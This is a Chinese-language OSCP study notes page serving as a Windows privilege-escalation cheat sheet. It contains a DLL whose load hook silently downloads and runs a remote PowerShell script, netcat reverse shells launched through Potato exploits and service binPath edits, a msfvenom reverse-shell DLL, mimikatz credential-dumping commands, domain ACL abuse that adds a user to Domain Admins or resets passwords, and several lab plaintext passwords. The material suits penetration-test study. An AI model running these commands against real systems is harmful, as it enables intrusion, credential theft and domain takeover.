+++
ShowToc = true
TocOpen = true
title = 'windows 提权'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'OSCP笔记'
+++


提权检查项目：注意细心！！！！！！！！！！一切异常情况

目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator

1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\



# 信息收集

```
start /b 程序  后台运行
cmd /k start 后台运行
```

查看管理员用户组：

```
本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
```

用户添加：

```
net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup "Remote Management Users" cxk /add  添加到远程管理组

```

查看当前用户所属组：

```
whoami /groups
```

通过注册表查看已经安装了的软件：

```
64位：
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

32位：
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

通过目录查看安装软件情况：

```
C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
```

正在运行的进程：

```
Get-Process
```


## 辅助脚本

```
PEASSL:
https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9

Seatbelt：
https://github.com/GhostPack/Seatbelt
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?tab=readme-ov-file


```

# 服务提权

```
查找服务，并过滤不处于运行中的服务，注意非用户安装的，就是非常规**C:\Windows\System32**下面的：
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} > 2.txt

权限表：
MASK	PERMISSIONS
F	Full access
M	Modify access
RX	Read and execute access
R	Read-only access
W	Write-only access

查看服务启动模式：
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}


Restart-Service xxx
Stop-Service xxx
```

## 查找服务提权的Ps脚本

```
1、https://github.com/itm4n/PrivescCheck.git


http远程调用：
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.9/PrivescCheck.ps1');Invoke-PrivescCheck"


2、https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
使用方法：
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile


微软官方，powershell管理服务的方法：
https://learn.microsoft.com/zh-cn/powershell/scripting/samples/managing-services?view=powershell-7.4#stopping-starting-suspending-and-restarting-services

```

## DLL劫持(需要RDP）

下载软件：
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon


dll.cpp

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("powershell.exe -nop -w hidden -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.240/nishang.ps1')");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

编译：

```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

路径，以下目录皆可：

```
$env:path
```



## 服务路径提权

```
查找，首先找到非常规目录的服务：
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
或者：
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """


如果显示程序占用可以使用move:

move bd.exe original.exe

然后确认是否具备重启服务，或者服务自动启动+重启机器的权限
Restart-Service GammaService
net stop mysql

重启机器，如果没有权限修改服务的情况下：
必须拥有SeShutDownPrivilege权限：
shutdown /r /t 0

随后确认路径是否具备写入权限：
icacls "C:\Program Files"

随后写入，然后重新启动

Restart-Service GammaService

值得注意的是，软件名字为带空格的目录的第一个单词，
举例：
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe


小技巧：
可以使用正则表达式：
.*\bsvchost\b.*
.*".*


```


# 计划任务提权


Scheduled Applications

```
查看计划任务：
schtasks /query /fo LIST /v


查看目录权限：
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe


```


# 提权WIKI

```
https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9

这里面也有域内的漏洞：
https://github.com/SecWiki/windows-kernel-exploits

```

# 特权提权


```
https://github.com/gtworek/Priv2Admin
```

# SeManageVolume


运行即可获取C盘所有读写权限，利用DLL劫持，systeminfo即可提权
```
https://github.com/CsEnox/SeManageVolumeExploit/
```



# SeImpersonatePrivilege提权

土豆家族：

https://github.com/xiaoy-sec/Pentest_Note/blob/master/wiki/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/Windows%E6%8F%90%E6%9D%83/JuicyPotato.md

总结
如果机器 >= Windows 10 1809 & Windows Server 2019 试试Rogue Potato
如果机器 < Windows 10 1809 < Windows Server 2019 试试Juicy Potato


神薯
https://github.com/BeichenDream/GodPotato/releases/tag/V1.20

RoguePotato


```
资料
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

github
https://github.com/antonioCoco/RoguePotato?tab=readme-ov-file

juicypotato可以从服务账户提权，服务账户的权限也需要进行检查


kali:
sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

nc -lvvp 4444

windows:
RoguePotato.exe -r 192.168.45.194 -e "c:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe 192.168.45.194 4444" -l 9999

查找CLSID
https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/
RoguePotato.exe -r 192.168.45.185 -c "{6d8ff8df-730d-11d4-bf42-00b0d0118b56}" -e "c:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 192.168.45.185 4444" -l 9999
```

roguepotato-and-printspoofer

```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
```

SweetPotato&printspoofer

```
SeImpersonatePrivilege 权限才行
https://github.com/uknowsec/SweetPotato?tab=readme-ov-file

SweetPotato.exe -a whoami



wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

.\PrintSpoofer64.exe -i -c powershell.exe
```

https://github.com/uknowsec/JuicyPotato   推荐这个，webshell版本

```
JuicyPotato_x32.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\spool\drivers\color\nc.exe -a "-e cmd 192.168.45.184 4445"
```


# 常用内核提权

```
https://github.com/abatchy17/WindowsExploits
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools
```

# 常见漏洞

```
<1> 远程漏洞

ms03-026

ms03-039 (1)

ms03-039 (2)

ms03-049

ms04-007

ms04-011 - ssl bof

ms04-011 - lsasarv.dll

ms04-031

ms05-017

ms05-039

ms06-040 (1)

ms06-040 (2)

ms06-070

ms08-067 (1)

ms08-067 (2)

ms08-067 (3)

ms09-050

<2> 本地漏洞

ms04-011

ms04-019 (1)

ms04-019 (2)

ms04-019 (3)

ms04-020

keybd_event

ms05-018

ms05-055

ms06-030

ms06-049

print spool service

ms08-025

netdde

ms10-015

ms10-059

ms10-092

ms11-080

ms14-040

ms14-058 (1)

ms14-058 (2)

ms14-070 (1)

ms14-070 (2)

ms15-010 (1)

ms15-010 (2)

**ms15-051**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools

ms16-014

ms16-016

**ms16-032**
https://github.com/zcgonvh/MS16-032/releases/tag/Release

```


# meterpreter

在整个学习期间，其实是尽量在减少对meterpreter的使用的，这里只记录一些常见的使用：

```
迁移进程：
getpid  查看当前pid
ps 寻找可迁移的pid
migrate <目标PID>


```

查看远程活动窗口&截图

```
qwinsta /server:127.0.0.1
```

# powershell


```
查看本地用户
Get-LocalUser
```


UnauthorizedAccess问题：

```
查看权限：

Get-ExecutionPolicy -Scope CurrentUser

更改：
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser


```


使用账号密码切换用户：

```
方法一：
$passwd = ConvertTo-SecureString "l33th4x0rhector" -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential ("hector", $passwd)
Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {(Get-Acl -Path .\keepmeon).Access | Where-Object { $_.IdentityReference -eq $env:USERNAME } "c:\Program Files\keepmeon"} -credential $cred


方法二：
$password = convertto-securestring -AsPlainText -Force -String "l33th4x0rhector"  
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "CONTROL\hector",$password  
# testing  
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential


$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -force $cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd) Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {whoami} -credential $cred
```

pwoershell 修改文件内容：

```
((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\cxk2.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1
```

powershell历史记录位置

```
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

查看当前用户权限：

```
whoami /priv
net user 用户名
```

powershell常用命令：

```
获取系统信息：
Get-WmiObject -Class Win32_OperatingSystem
导入脚本：
import-module .\脚本
查看菜单：
menu

删除文件：
Remove-Item -Path C:\path\to\file.txt

powershell身份切换，类似于su的实现：

执行whoami:

$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM";
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;

反弹shell:

执行程序
Start-Process -FilePath c:\users\nico\downloads\SharpHound.exe

powershell 绕过：

C:\WIndOWs\sySwOw64\WINdOwspOweRshEll\v1.0\poWersHeLl.Exe

查看隐藏文件：
Get-ChildItem -Force


身份切换方式2：
https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
import-module ./Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```

列出文件树：

```
Get-ChildItem -Recurse
```

文件查找：

```
Get-ChildItem -Path C:\ -Include *flag* -File -Recurse -ErrorAction SilentlyContinue
```

# windows本地提权

服务提权：

```
1、创建服务：
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2  1234"
2、开启服务：
sc.exe stop vss  
sc.exe start vss
```

## 权限赋予

```
授予权限：
icacls C:\path\to\your\directory /grant username:(permissions)
username: 要授予权限的用户名。
permissions: 要授予的权限。例如，F 表示完全控制，R 表示读取，W 表示写入等。可以使用多个字母组合，如 RW 表示读写权限。
```

# 域内提权注意权限：

```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

## BACKUP OPERATORS组提权

推荐

```
https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/
```

资料

```
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#f402
```

```
https://github.com/jakobfriedl/precompiled-binaries/tree/e6f7025e75dfc906d14e2fe33d0ebc6a321ece4a
```

```
https://www.bordergate.co.uk/backup-operator-privilege-escalation/
```

推荐

```
https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801
```

推荐

```
https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets
```
## GenericWrite权限

```
powerview

Set-DomainObject -Identity maria -SET @{scriptpath="C:\\Windows\\System32\\spool\\drivers\\color\\powercat.ps1"}
```

### WriteOwner 组权限

```
upload PowerView.ps1
Import-Module .\PowerView.ps1

1。 设置为组所有者
Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'

2. 给自己授予全部权限
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All

3. 把自己添加到dbadmin
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

### WriteOwner 用户权限

```
 . .\PowerView.ps1 //将PowerView导入
     把当前用户tom设置为claire用户的 ACL 的所有者并授予其修改密码的权限
    Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
    Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword -Verbose
    设置claire的密码为Ab345678123!@#
    $cred = ConvertTo-SecureString "Ab345678123!@#" -AsPlainText -force
    Set-DomainUserPassword -identity claire -accountpassword $cred
```

## Genericall 权限

```
使用hash的方式修改密码，如果使用明文密码的话，取消最后面的--pw-nt-hash即可

net rpc password "Tristan.Davies" "newP@ssword2023" -U "search.htb"/"BIR-ADFS-GMSA$"  -S "RESEARCH.search.htb" --pw-nt-hash

```





# mimikatz


```
```第一步，提升权限：
privilege::debug
token::elevate

以所有方式获取密码：
sekurlsa::logonpasswords

以SAM获取密码：
lsadump::sam


导出TGT：
sekurlsa::tickets /export
查看TGT：
dir *.kirbi
导入TGT，后面的是TGT文件名字：
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >mimikatz.txt

./mimikatz.exe "lsadump::sam /sam:c:\windows.old\Windows\System32\SAM /system:c:\windows.old\Windows\System32\SYSTEM" "exit" >> sam.txt


./mimikatz.exe "vault::list" "exit" >mimikatz.txt
```

更多使用方法：

```
https://mp.weixin.qq.com/s/IDE2QEzVeuXk6liNeXhxpg
```

powershell版本：

```
https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1
```

# 密码本和信息检索

git 

在软件目录中查找：

```
Get-ChildItem -Path C:\xampp -Include *.ini -File -Recurse -ErrorAction SilentlyContinue

powershell "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
```

在用户目录下查找：

```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.log,*.kdbx,*.exe -File -Recurse -ErrorAction SilentlyContinue
```

powershell历史记录：

```
获取文件存储位置：
(Get-PSReadlineOption).HistorySavePath

事件查看器：
eventvwr.msc

Event Viewer → Events from Script Block Logging are in Application and Services → Microsoft → Windows → PowerShell → Operational: 

Click Filter Current Log and search for 4104 events
```

flag隐藏：
备用数据流：

```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,440,134,656 bytes free
               
C:\Users\Administrator\Desktop>powershell Get-Content -Path "hm.txt" -Stream "root.txt"
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
afbc5bd4b615a60648cec41c6ac9253
```

# GUI下的身份切换

```
runas /user:backupadmin cmd
```

# C盘写入提权

```
systeminfo
c:\windows\system32\wbem
tzres.dll


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.154 LPORT=135 -f dll -o tzres.dll
```